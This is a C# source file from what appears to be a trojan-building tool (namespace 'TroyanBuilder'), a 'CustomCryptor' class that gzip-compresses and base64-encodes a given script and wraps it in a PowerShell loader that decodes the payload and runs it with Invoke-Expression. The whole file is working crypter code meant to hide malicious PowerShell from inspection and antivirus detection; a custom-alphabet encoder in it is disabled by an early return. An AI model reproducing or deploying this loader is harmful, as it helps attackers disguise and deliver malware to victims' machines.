using System.IO.Compression;
using System.Text;

namespace TroyanBuilder
{
    public static class CustomCryptor
    {
        private const string StandardBase64Chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
        private const string CustomBase64Chars = "QWERTYUIOPLKJHGFDSAZXCVBNMasdfghjklqwertyuiopzxcvbnm9876543210+/";

        public static string Encode(string input, string filePath)
        {
            var bytes = Encoding.UTF8.GetBytes(input);
            return EncodeBytes(bytes, filePath);
        }

        public static string Encode(string input)
        {
            var bytes = Encoding.UTF8.GetBytes(input);
            return EncodeBytes(bytes);
        }

        public static string EncodeBytes(byte[] bytes)
        {
            using var outputStream = new MemoryStream();
            using (var zipStream = new GZipStream(outputStream, CompressionMode.Compress))
            {
                zipStream.Write(bytes, 0, bytes.Length);
            }

            var compressedBytes = outputStream.ToArray();
            var base64 = Convert.ToBase64String(compressedBytes);
            return base64;
        }

        public static string EncodeBytes(byte[] bytes, string filePath)
        {
            var customBase64 = EncodeBytes(bytes);
            File.WriteAllText(filePath, customBase64);
            return customBase64;
        }

        private static string EncodeBase64(string base64)
        {
            return base64;
            var customBase64 = new StringBuilder(base64.Length);
            for (int i = 0; i < base64.Length; i++)
            {
                var index = StandardBase64Chars.IndexOf(base64[i]);
                customBase64.Append(index >= 0 ? CustomBase64Chars[index] : base64[i]);
            }

            return customBase64.ToString();
        }



        public static string GeneratePowerShellScript(string powerShellCode)
        {
            var encoded = Encode(powerShellCode);
            return $@"
$EncodedScript = ""{encoded}""

function Decode-Script {{
    param([string]$EncodedText)
    $CompressedBytes = [Convert]::FromBase64String($EncodedText)
    $MemoryStream = New-Object System.IO.MemoryStream(, $CompressedBytes)
    $GzipStream = New-Object System.IO.Compression.GzipStream($MemoryStream, [System.IO.Compression.CompressionMode]::Decompress)
    $StreamReader = New-Object System.IO.StreamReader($GzipStream, [System.Text.Encoding]::UTF8)
    $StreamReader.ReadToEnd()
}}

function Run-Script {{
    $DecodedScript = Decode-Script -EncodedText $EncodedScript
    Invoke-Expression $DecodedScript
}}

Run-Script
";
        }


        public static void GeneratePowerShellScript(string inFile, string outFile)
        {
            var data = File.ReadAllText(inFile);
            data = GeneratePowerShellScript(data);
            System.IO.File.WriteAllText(outFile, data);
        }
    }
}